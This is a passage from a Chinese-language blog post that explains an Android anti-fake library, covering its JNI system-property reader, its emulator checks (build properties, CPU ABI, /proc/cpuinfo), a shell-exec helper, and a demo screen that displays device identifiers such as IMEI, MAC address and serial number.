*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;lishang&quot;</span>,__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">proGetSS</span></span></span><br><span class="line"><span class="function">        <span class="params">(JNIEnv *env, jclass clazz, jstring keyJ, jstring defJ)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *key;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    jstring rvJ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyJ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="string">&quot;key must not be null.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = (*env)-&gt;<span class="built_in">GetStringUTFChars</span>(env, keyJ, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    len = __system_property_get(key, buf);</span><br><span class="line">    <span class="keyword">if</span> ((len &lt;= <span class="number">0</span>) &amp;&amp; (defJ != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        rvJ = defJ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        rvJ = (*env)-&gt;<span class="built_in">NewStringUTF</span>(env, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rvJ = (*env)-&gt;<span class="built_in">NewStringUTF</span>(env, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (*env)-&gt;<span class="built_in">ReleaseStringUTFChars</span>(env, keyJ, key);</span><br><span class="line"></span><br><span class="line">    error:</span><br><span class="line">    <span class="keyword">return</span> rvJ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function">    <span class="title">proGet</span><span class="params">(JNIEnv *env, jclass clazz, jstring keyJ)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">proGetSS</span>(env, clazz, keyJ, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *className,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 JNINativeMethod *gMethods, <span class="type">int</span> numMethods)</span> </span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line"></span><br><span class="line">    clazz = (*env)-&gt;<span class="built_in">FindClass</span>(env, className);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*env)-&gt;<span class="built_in">RegisterNatives</span>(env, clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *classPathName = <span class="string">&quot;com/snail/antifake/jni/PropertiesGet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> JNINativeMethod methods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;native_get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, (<span class="type">void</span> *) proGet&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;native_get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span>, (<span class="type">void</span> *) proGetSS&#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*vm)-&gt;<span class="built_in">GetEnv</span>(vm, (<span class="type">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK)</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">registerNativeMethods</span>(env, classPathName, methods, <span class="built_in">sizeof</span>(methods)/<span class="built_in">sizeof</span>(methods[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line"></span><br><span class="line">    result = JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">    bail:</span><br><span class="line">    <span class="comment">//LOGI(&quot;Leaving JNI_OnLoad (result=0x%x)\n&quot;, result);</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>registerNativeMethods</code>注册<code>com/snail/antifake/jni/PropertiesGet</code>下的两个方法</p><p>然后<code>proGet</code>和<code>proGetSS</code>的返回值变量类型定义为<code>JNIEXPORT jstring JNICALL</code></p><ul><li><code>JNIEXPORT</code> 的核心作用是<strong>将 native 函数标记为 “可导出符号”</strong></li><li><code>JNICALL</code> 的作用是<strong>统一函数的调用约定</strong></li><li><code>jstring</code>：是函数的<strong>返回值类型</strong>，对应 Java 中的 <code>String</code> 类型</li></ul><p><code>len = __system_property_get(key, buf);</code>主要是通过这个函数读取相应的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __system_property_get(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">char</span> *value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 数据已经存储在共享内存中，通过__system_property_area__ 即可获取到，之后等待读取完返回</span></span><br><span class="line">    <span class="type">const</span> prop_info *pi = __system_property_find(name);</span><br><span class="line">    <span class="keyword">if</span>(pi != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> __system_property_read(pi, <span class="number">0</span>, value); <span class="comment">// 阻塞式读取</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isEmulatorViaBuild"><a href="#isEmulatorViaBuild" class="headerlink" title="isEmulatorViaBuild"></a>isEmulatorViaBuild</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorViaBuild</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>).toLowerCase().contains(<span class="string">&quot;sdk&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ro.product.manufacturer likes unknown</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.manufacture&quot;</span>).toLowerCase().contains(<span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ro.product.device likes generic</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>).toLowerCase().contains(<span class="string">&quot;generic&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><ul><li><code>ro.product.model</code>: 这是一个系统属性，通常表示<strong>设备的型号</strong>。在模拟器环境中，这个值经常包含 “sdk” 字样，例如 “sdk_gphone_x86”、”Android SDK built for x86” 等。</li><li><code>ro.product.manufacturer</code>: 这是一个系统属性，表示<strong>设备的制造商</strong>。在某些模拟器（尤其是 Genymotion 或一些早期模拟器）中，这个值可能被设置为 “unknown” 或其他非真实制造商的字符串。</li><li><code>ro.product.device</code>: 这是一个系统属性，表示设<strong>备的代号或名称</strong>。Android 模拟器（AVD）通常会使用 “generic” 作为其设备名称的一部分，例如 “generic_x86”、”generic_arm64” 等。</li></ul><h4 id="isEmulatorFromAbi"><a href="#isEmulatorFromAbi" class="headerlink" title="isEmulatorFromAbi"></a>isEmulatorFromAbi</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromAbi</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    String abi= AndroidDeviceIMEIUtil.getCpuAbi();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(abi) &amp;&amp; abi.contains(<span class="string">&quot;x86&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过架构来判断模拟器</p><h4 id="isEmulatorFromCpu"><a href="#isEmulatorFromCpu" class="headerlink" title="isEmulatorFromCpu"></a>isEmulatorFromCpu</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查杀比较严格，放在最后，直接pass x86</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromCpu</span><span class="params">()</span> &#123;</span><br><span class="line">    ShellAdbUtils.<span class="type">CommandResult</span> <span class="variable">commandResult</span> <span class="operator">=</span> ShellAdbUtils.execCommand(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cpuInfo</span> <span class="operator">=</span> commandResult == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : commandResult.successMsg;</span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(cpuInfo) &amp;&amp; ((cpuInfo.toLowerCase().contains(<span class="string">&quot;intel&quot;</span>) || cpuInfo.toLowerCase().contains(<span class="string">&quot;amd&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过命令行获取cpu信息，如果是intel或者amd的直接杀死</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> CommandResult <span class="title function_">execCommand</span><span class="params">(String[] commands, <span class="type">boolean</span> isRoot, <span class="type">boolean</span> isNeedResultMsg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (commands == <span class="literal">null</span> || commands.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommandResult</span>(result, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">successResult</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">errorResult</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">successMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">DataOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process = Runtime.getRuntime().exec(isRoot ? COMMAND_SU : COMMAND_SH);</span><br><span class="line">        os = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(process.getOutputStream());</span><br><span class="line">        <span class="keyword">for</span> (String command : commands) &#123;</span><br><span class="line">            <span class="keyword">if</span> (command == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// donnot use os.writeBytes(commmand), avoid chinese charset error</span></span><br><span class="line">            os.write(command.getBytes());</span><br><span class="line">            os.writeBytes(COMMAND_LINE_END);</span><br><span class="line">            os.flush();</span><br><span class="line">        &#125;</span><br><span class="line">        os.writeBytes(COMMAND_EXIT);</span><br><span class="line">        os.flush();</span><br><span class="line"></span><br><span class="line">        result = process.waitFor();</span><br><span class="line">        <span class="comment">// get command result</span></span><br><span class="line">        <span class="keyword">if</span> (isNeedResultMsg) &#123;</span><br><span class="line">            successMsg = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            errorMsg = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            successResult = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            errorResult = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()));</span><br><span class="line">            String s;</span><br><span class="line">            <span class="keyword">while</span> ((s = successResult.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                successMsg.append(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ((s = errorResult.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                errorMsg.append(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="literal">null</span>) &#123;</span><br><span class="line">                os.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (successResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                successResult.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (errorResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                errorResult.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (process != <span class="literal">null</span>) &#123;</span><br><span class="line">            process.destroy();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommandResult</span>(result, successMsg == <span class="literal">null</span> ? <span class="literal">null</span> : successMsg.toString(), errorMsg == <span class="literal">null</span> ? <span class="literal">null</span></span><br><span class="line">            : errorMsg.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>process = Runtime.getRuntime().exec(isRoot ? COMMAND_SU : COMMAND_SH);</code>运行一个shell</p><ul><li>通过 <code>DataOutputStream os = new DataOutputStream(process.getOutputStream());</code> 获取到子进程的标准输入流</li><li>代码会遍历 <code>commands</code> 数组，将每一条命令写入这个流中</li><li>每条命令后都会写入一个换行符 <code>COMMAND_LINE_END</code>，这模拟了回车操作，是命令得以执行的前提</li><li>在所有命令都写入后，会写入 <code>COMMAND_EXIT</code> 命令。这会使 <code>su</code> 或 <code>sh</code> 进程正常退出，从而让 <code>process.waitFor()</code> 调用可以结束等待。如果没有这一步，程序会永久阻塞</li><li><code>result = process.waitFor();</code>: 这行代码会阻塞当前线程，直到子进程执行完毕并返回退出码。</li><li>如果 <code>isNeedResultMsg</code> 为 <code>true</code>，代码会创建 <code>BufferedReader</code> 来分别读取子进程的标准输出流 (<code>process.getInputStream()</code>) 和标准错误流 (<code>process.getErrorStream()</code>)，并将结果存入 <code>StringBuilder</code></li></ul><h3 id="onCreate-2"><a href="#onCreate-2" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        综合判断一次</span></span><br><span class="line">        binding.btnSycnInteger.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_sycn_integer);</span><br><span class="line">                textView.setText(<span class="string">&quot;综合判断是否模拟器 &quot;</span> + EmulatorDetectUtil.isEmulatorFromAll(MainActivity.<span class="built_in">this</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 只考虑cache，Android R之后，模拟器机制有变化，检测会有问题</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromAll</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> AndroidDeviceIMEIUtil.isRunOnEmulator(context) || detectS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是上述几个判断的合体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//获取其他硬件信息</span></span><br><span class="line">    binding.btnHwinfo.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            requestGetInfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="meta">@SuppressLint(&quot;SetTextI18n&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestGetInfo</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不同的版本不一样，4.3之前ITelephony没有getDeviceId</span></span><br><span class="line">    <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(MainActivity.<span class="built_in">this</span>, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        ActivityCompat.requestPermissions(MainActivity.<span class="built_in">this</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_PHONE_STATE&#125;,</span><br><span class="line">                <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        renderHWInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会检测是否有<code>PackageManager.PERMISSION_GRANTED</code>权限</p><p>如果没权限会执行<code>ActivityCompat.requestPermissions</code>弹出一个对话框，请求用户添加权限</p><p>如果权限已经被授予，则会执行<code>renderHWInfo();</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;SetTextI18n&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">renderHWInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">apideviceId</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        apideviceId = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binding.tvDeviceid.setText(</span><br><span class="line">            <span class="string">&quot; \n \n设备信息 &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  \n\n最终方法获取IMEI  : &quot;</span> + AndroidDeviceIMEIUtil.getDeviceId(mActivity) + <span class="string">&quot; 是否有效 &quot;</span> + AndroidDeviceIMEIUtil.isValidIMEI(AndroidDeviceIMEIUtil.getDeviceId(mActivity))</span><br><span class="line">                    + <span class="string">&quot;\n最终方法获取MAC地址 : &quot;</span> + AndroidDeviceIMEIUtil.getMacAddress(mActivity) + <span class="string">&quot; 是否有效 &quot;</span> + AndroidDeviceIMEIUtil.isValidAddress(MacAddressUtils.getMacAddress(mActivity))</span><br><span class="line">                    + <span class="string">&quot;\n最终方法获取AndroidID : &quot;</span> + AndroidDeviceIMEIUtil.getAndroidId(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\n最终方法获取序列号 : &quot;</span> + AndroidDeviceIMEIUtil.getSerialno()</span><br><span class="line">                    + <span class="string">&quot;\n特征值检测是否模拟器  : &quot;</span> + EmuCheckUtil.mayOnEmulator(mActivity)</span><br><span class="line">                    + <span class="string">&quot; \n\nIMEI详细信息: &quot;</span></span><br><span class="line">                    + <span class="string">&quot; \n\n可Hook系统API获取Deviceid: &quot;</span> + apideviceId</span><br><span class="line">                    + <span class="string">&quot;\nProxy代理获取Deviceid level0 : &quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel0(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nProxy代理获取Deviceid level1 :&quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel1(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nProxy代理获取Deviceid level2 :&quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel2(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtil获取DeviceId level0: &quot;</span> + ITelephonyUtil.getDeviceIdLevel0(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtil获取DeviceId level1 : &quot;</span> + ITelephonyUtil.getDeviceIdLevel1(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtil获取DeviceId level2 :&quot;</span> + ITelephonyUtil.getDeviceIdLevel2(mActivity)</span><br><span class="line">                 );</span><br><span class="line"></span><br><span class="line">    binding.tvAndroididMacSerial.setText(<span class="string">&quot;\n\n序列号信息 ：&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  \n\n系统API反射获取序列号 ： &quot;</span> + 